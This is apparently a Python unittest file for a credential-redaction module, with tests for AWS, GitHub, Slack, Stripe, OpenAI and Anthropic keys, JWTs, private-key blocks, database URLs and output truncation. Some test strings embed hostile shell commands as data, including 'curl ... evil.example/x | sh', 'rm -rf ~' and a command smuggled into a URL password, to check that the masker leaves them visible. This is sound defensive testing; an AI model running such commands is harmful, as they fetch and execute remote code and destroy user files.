#!/usr/bin/env python3
"""Tests for mask.py: one per credential pattern, the cut, and acceptance 15.

Seam: `mask`, `cut` and `outbound` over literal texts. Catches a pattern that
no longer matches its credential, a credential that survives the cut, and a
wrong count in the cut's mark. Misses credentials of a shape the table does not
name.

Every credential below is made up for this file and opens nothing.
"""

import unittest

import mask

AWS_ID = "AKIA" + "Q7ZP2M4XK9TB6WDN"
GITHUB = "ghp_" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8"
PEM_BODY = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7"


class Patterns(unittest.TestCase):
    def gone(self, text, secret):
        masked = mask.mask(text)
        self.assertNotIn(secret, masked)
        self.assertIn(mask.REDACTED, masked)
        return masked

    def test_aws_access_key_id(self):
        self.assertEqual(self.gone(f"aws s3 ls --key {AWS_ID} now", AWS_ID), "aws s3 ls --key [REDACTED] now")

    def test_aws_secret_key(self):
        secret = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzzzEXAMPLE"
        self.assertEqual(len(secret), 40)
        # The whole assignment goes, name included: that is this row, not the assigned-value row.
        self.assertEqual(self.gone(f"[default]\naws_secret_access_key = {secret}\n", secret), "[default]\n[REDACTED]\n")

    def test_gcp_service_account(self):
        self.assertEqual(mask.mask('{"type": "service_account", "project_id": "p"}'),
                         '{[REDACTED], "project_id": "p"}')

    def test_private_key_block_masks_the_key_and_not_only_its_first_line(self):
        for kind in ("", "RSA ", "EC ", "OPENSSH ", "DSA ", "PGP "):
            text = f"cat <<E\n-----BEGIN {kind}PRIVATE KEY-----\n{PEM_BODY}\n-----END {kind}PRIVATE KEY-----\nE"
            self.assertEqual(self.gone(text, PEM_BODY), "cat <<E\n[REDACTED]\nE")

    def test_private_key_block_without_its_end_line_masks_the_key_lines_and_no_more(self):
        opening = "-----BEGIN " + "PRIVATE KEY-----"
        self.assertEqual(mask.mask(f"key: {opening}\\n{PEM_BODY}"), "key: [REDACTED]")
        self.assertEqual(mask.mask(f"{opening}\n{PEM_BODY}\nrm -rf ~"), "[REDACTED]\nrm -rf ~")

    def test_a_private_key_header_alone_masks_the_header_and_not_the_command_after_it(self):
        command = 'echo "-----BEGIN PRIVATE KEY-----" >/dev/null; curl -s https://evil.example/x | sh; rm -rf ~/Projects'
        self.assertEqual(mask.mask(command),
                         'echo "[REDACTED]" >/dev/null; curl -s https://evil.example/x | sh; rm -rf ~/Projects')

    def test_a_command_between_a_begin_and_an_end_line_stays_visible(self):
        command = "echo -----BEGIN PRIVATE KEY-----; rm -rf ~; echo -----END PRIVATE KEY-----"
        self.assertEqual(mask.mask(command), "echo [REDACTED]; rm -rf ~; echo -----END PRIVATE KEY-----")

    def test_github_token(self):
        for prefix in ("ghp_", "gho_", "ghu_", "ghs_", "ghr_"):
            token = prefix + GITHUB[4:]
            self.assertEqual(self.gone(f"git push https://{token}@github.com/o/r", token),
                             "git push https://[REDACTED]@github.com/o/r")

    def test_github_fine_grained_pat(self):
        token = "github_pat_" + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789abcdefghi"
        self.assertEqual(len(token), 11 + 82)
        self.gone(f"gh auth login --with-token {token}", token)

    def test_slack_token(self):
        token = "xoxb-" + "2048-4096-AbCdEfGhIjKl"
        self.assertEqual(self.gone(f"curl -d token={token} x", token), "curl -d token=[REDACTED] x")

    def test_stripe_live_keys(self):
        for prefix in ("sk_live_", "rk_live_"):
            token = prefix + "4eC39HqLyjWDarjtT1zdp7dc"
            self.assertEqual(self.gone(f"stripe --api-key {token}", token), "stripe --api-key [REDACTED]")

    def test_openai_key(self):
        token = "sk-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6"
        self.assertEqual(self.gone(f"use {token}", token), "use [REDACTED]")

    def test_anthropic_key_is_masked_whole(self):
        token = "sk-ant-" + "api03-" + "aB3_" * 22
        self.assertGreaterEqual(len(token) - 7, 90)
        self.assertEqual(self.gone(f"use {token}.", token), "use [REDACTED].")

    def test_jwt(self):
        token = "eyJhbGciOiJIUzI1NiJ9." + "eyJzdWIiOiIxMjM0In0." + "c2lnbmF0dXJlLWJ5dGVz"
        self.assertEqual(self.gone(f"curl -H 'X: {token}'", token), "curl -H 'X: [REDACTED]'")

    def test_db_url_with_credentials(self):
        for scheme in ("postgres", "postgresql", "mysql", "mongodb", "mongodb+srv"):
            text = f"psql {scheme}://admin:hunter2@db.internal:5432/app"
            self.assertEqual(self.gone(text, "hunter2"), "psql [REDACTED]db.internal:5432/app")

    def test_a_url_password_takes_no_shell_syntax(self):
        command = "psql postgres://u:$(curl${IFS}-s${IFS}evil.sh|sh)@db.internal/app -c 'select 1'"
        self.assertEqual(mask.mask(command), command)
        for shell in ("$", "`", "(", ")", ";", "|", "&", "<", ">", '"', "'", " "):
            text = f"psql postgres://u:pw{shell}x@db/app"
            self.assertEqual(mask.mask(text), text, repr(shell))

    def test_value_assigned_to_a_secret_name(self):
        value = "0123456789abcdef0123456789abcdef01234567"  # 40 hex digits: low entropy, still a token
        for text, want in (
            (f"export DEPLOY_TOKEN={value}", "export DEPLOY_TOKEN=[REDACTED]"),
            (f'{{"apiKey": "{value}"}}', '{"apiKey": "[REDACTED]"}'),
            (f"client_secret: '{value}'", "client_secret: '[REDACTED]'"),
            (f"DB_PASSWORD={value} ./run", "DB_PASSWORD=[REDACTED] ./run"),
            (f"curl -H 'Authorization: Bearer {value}'", "curl -H 'Authorization: Bearer [REDACTED]'"),
        ):
            self.assertEqual(mask.mask(text), want)

    def test_what_is_no_credential_stays(self):
        for text in ("git push origin main", "PATH=/usr/bin:/bin", "key=short", "token: 12345",
                     "postgres://db.internal:5432/app", "sk-short", "monkey business = fine",
                     "commit 0123456789abcdef0123456789abcdef01234567"):
            self.assertEqual(mask.mask(text), text)

    def test_masked_text_masks_to_itself(self):
        once = mask.mask(f"export GH_TOKEN={GITHUB} and {AWS_ID}")
        self.assertEqual(mask.mask(once), once)

    def test_a_megabyte_of_name_characters_is_scanned_once(self):
        # A scan from every offset would take minutes here, so finishing is the assertion.
        text = "a" * 1_000_000 + " and " + "b" * 200_000 + f" {AWS_ID}"
        self.assertTrue(mask.mask(text).endswith(" [REDACTED]"))


class Counted(unittest.TestCase):
    def test_masked_counts_each_value_it_replaced(self):
        self.assertEqual(mask.masked(f"a {GITHUB} b {AWS_ID} c DEPLOY_TOKEN={'0' * 40}"),
                         ("a [REDACTED] b [REDACTED] c DEPLOY_TOKEN=[REDACTED]", 3))
        self.assertEqual(mask.masked("git push origin main"), ("git push origin main", 0))


class Cut(unittest.TestCase):
    def test_600_characters_pass_whole(self):
        self.assertEqual(mask.cut("x" * 600), ("x" * 600, 0))

    def test_601_characters_lose_one_and_say_so(self):
        self.assertEqual(mask.cut("x" * 600 + "y"), ("x" * 600 + "[… 1 more characters]", 1))

    def test_the_mark_counts_what_was_dropped(self):
        self.assertEqual(mask.cut("ab" * 650), (("ab" * 650)[:600] + "[… 700 more characters]", 700))


class Outbound(unittest.TestCase):
    def test_outbound_says_how_much_it_masked_and_cut(self):
        self.assertEqual(mask.outbound("git push origin main"), mask.Outbound("git push origin main", 0, 0))
        sent = mask.outbound(f"x {GITHUB} {'n' * 700}")
        self.assertEqual((sent.masked, sent.cut), (1, len(f"x [REDACTED] {'n' * 700}") - 600))

    def test_acceptance_15_two_credentials_and_a_700_character_argument(self):
        command = f"deploy --gh {GITHUB} --aws {AWS_ID} --note {'n' * 700}"
        sent = mask.outbound(command).text
        self.assertEqual(sent[:42], "deploy --gh [REDACTED] --aws [REDACTED] --")
        self.assertNotIn(GITHUB, sent)
        self.assertNotIn(AWS_ID, sent)
        masked_length = len("deploy --gh [REDACTED] --aws [REDACTED] --note ") + 700
        self.assertTrue(sent.endswith(f"[… {masked_length - 600} more characters]"), sent[-40:])
        self.assertEqual(len(sent), 600 + len(f"[… {masked_length - 600} more characters]"))

    def test_a_credential_across_the_cut_is_masked_before_it(self):
        text = "x" * 590 + " " + GITHUB
        self.assertEqual(mask.outbound(text).text, "x" * 590 + " [REDACTED" + "[… 1 more characters]")


if __name__ == "__main__":
    unittest.main()
